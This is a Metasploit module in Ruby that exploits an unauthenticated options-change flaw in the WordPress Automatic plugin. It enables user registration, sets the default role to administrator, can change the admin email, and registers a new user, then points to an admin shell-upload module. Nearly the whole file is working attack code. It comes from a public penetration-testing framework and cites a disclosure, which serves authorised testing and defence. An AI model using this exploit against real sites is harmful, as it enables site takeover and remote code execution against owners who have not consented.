##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Plugin Automatic Config Change to RCE',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary wordpress options change vulnerability
          in the Automatic (wp-automatic) plugin.  If WPEMAIL is provided, the administrator's email
          address will be changed.  User registration is
          enabled, and default user role is set to administrator.  A user is then created with
          the USER name set.  A valid EMAIL is required to get the registration email (not handled in MSF).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit module
          'Jerome Bruandet'
        ],
        'DisclosureDate' => '2021-09-06',
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [['WordPress', {}]],
        'DefaultTarget' => 0,
        'References' => [
          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )
    register_options [
      OptString.new('EMAIL', [true, 'Email for registration', nil]),
      OptString.new('USER', [true, 'Username for registration', 'msfuser'])
    ]

    register_advanced_options [
      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil])
    ]
  end

  def check
    return Exploit::CheckCode::Safe('Wordpress not detected.') unless wordpress_and_online?

    # this is for pickup into the vulnerable plugins list
    # check_plugin_version_from_readme('wp-automatic', '3.53.3')

    if set_wp_option(Rex::Text.rand_text_numeric(8..20), Rex::Text.rand_text_numeric(8..20)) == true
      checkcode = Exploit::CheckCode::Vulnerable
    else
      checkcode = Exploit::CheckCode::Safe
    end

    if checkcode == Exploit::CheckCode::Safe
      print_error('Automatic not a vulnerable version')
    end
    return checkcode
  end

  def set_wp_option(key, value)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-automatic', 'process_form.php'),
      'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },
      'vars_post' => { key => value },
      'keep_cookies' => 'true'
    })
    fail_with(Failure::Unreachable, 'Site not responding') unless res
    res && res.code == 200 && res.body.include?('{"status":"success"}')
  end

  def run
    # lots of copy pasta from wp_gdpr_compliance_privesc
    if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)
      print_warning("Changing admin e-mail address to #{datastore['WPEMAIL']}...")
      unless set_wp_option('admin_email', datastore['WPEMAIL'])
        print_error('Failed to change the admin e-mail address')
        return
      end
    end

    print_warning('Enabling user registrations...')
    unless set_wp_option('users_can_register', '1')
      print_error('Failed to enable user registrations')
      return
    end

    print_warning('Setting the default user role type to administrator...')
    unless set_wp_option('default_role', 'administrator')
      print_error('Failed to set the default user role')
      return
    end

    print_status("Registering #{datastore['USER']} with email #{datastore['EMAIL']}")
    unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])
      print_error('Failed to register user')
      return
    end

    vprint_good('For a shell: use exploits/unix/webapp/wp_admin_shell_upload')
  end
end
